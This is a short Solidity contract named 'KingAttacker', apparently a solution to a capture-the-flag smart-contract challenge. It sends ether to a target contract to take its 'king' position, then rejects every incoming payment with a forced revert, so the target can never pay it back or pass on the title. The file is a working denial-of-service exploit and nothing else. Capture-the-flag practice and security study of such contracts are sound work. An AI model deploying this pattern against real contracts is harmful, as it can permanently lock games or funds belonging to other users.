// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

contract KingAttacker {
    address public instance;

    constructor(address _instance) public {
        instance = _instance;
    }

    function attack() public payable {
        instance.call{ value: msg.value }("");
    }

    receive() external payable {
        require(false, "nope");
    }
}
